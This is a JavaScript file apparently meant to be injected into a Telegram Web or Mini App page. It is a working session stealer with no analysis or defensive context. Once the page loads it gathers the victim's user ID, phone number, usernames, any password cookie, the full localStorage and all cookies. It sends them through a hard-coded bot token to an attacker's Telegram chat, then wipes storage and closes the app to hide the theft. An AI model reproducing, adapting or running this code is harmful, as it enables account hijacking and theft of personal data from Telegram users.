document.addEventListener("DOMContentLoaded", function () {  
  async function sendSessionToBot(sessionDump) {  
    const botToken = "7682770989:AAHbVbpeT6k6XEUR2FsR0tG5l_3HNrPcgtA"; // 🔁 Replace  
    const chatId = "6686015911";     // 🔁 Replace (your Telegram ID or group ID)  
  
    const readable = `  
🚨 *Session Captured*  
  
🆔 *User ID:* ${sessionDump.userId}
🌟 *Username:* ${sessionDump.usernames}
👤 *Name:* ${sessionDump.firstName}  
📞 *Phone:* ${sessionDump.phoneNumber}  
🔑 *Password:* ${sessionDump.password}  
💎 *Premium:* ${sessionDump.isPremium ? "Yes" : "No"}  
🔗 *Type:* ${sessionDump.type}  
📂 *Keys:* ${Object.keys(sessionDump.localStorage || {}).join(", ")}  
  
A full session dump is attached as JSON.  
`;  
  
    const file = new Blob([JSON.stringify(sessionDump, null, 2)], {  
      type: "application/json",  
    });  
  
    const formData = new FormData();  
    formData.append("chat_id", chatId);  
    formData.append("caption", readable);  
    formData.append("document", file, "telegram-session.json");  
    formData.append("parse_mode", "Markdown");  
  
    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {  
      method: "POST",  
      body: formData,  
    });  
  }  
  
  function captureAll() {  
    const state = localStorage.getItem("tt-global-state");  
    const auth = localStorage.getItem("user_auth");  
    if (!state || !auth) return;  
  
    const parsed = JSON.parse(state);  
    const user = parsed.users.byId[parsed.currentUserId];  
    if (!user) return;  
  
    // Build full localStorage dump  
    const localDump = {};  
    for (let i = 0; i < localStorage.length; i++) {  
      const key = localStorage.key(i);  
      localDump[key] = localStorage.getItem(key);  
    }  
  
    // Parse cookies  
    const cookies = {};  
    document.cookie.split("; ").forEach(c => {  
      const [key, val] = c.split("=");  
      cookies[key] = val;  
    });  
  
    // Query string extras  
    const urlParams = new URLSearchParams(window.location.search);  
  
    const sessionDump = {  
      userId: parsed.currentUserId,  
      firstName: user.firstName,  
      usernames: user.usernames,  
      phoneNumber: user.phoneNumber,  
      isPremium: user.isPremium,  
      password: cookies.password || "N/A",  
      type: urlParams.get("type") || null,  
      channelid: urlParams.get("id") || null,  
      localStorage: localDump,  
      cookies: cookies,  
      userAgent: navigator.userAgent,  
    };  
  
    sendSessionToBot(sessionDump);  
  
    // Cleanup  
    localStorage.clear();  
    sessionStorage.clear();  
    document.cookie.split(";").forEach(c => {  
      document.cookie = c.split("=")[0] + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";  
    });  
  
    try {  
      window.Telegram.WebApp.close();  
    } catch {  
      window.location.href = "https://web.telegram.org/a/";  
    }  
  
    clearInterval(loop);  
  }  
  
  const loop = setInterval(captureAll, 100);  
});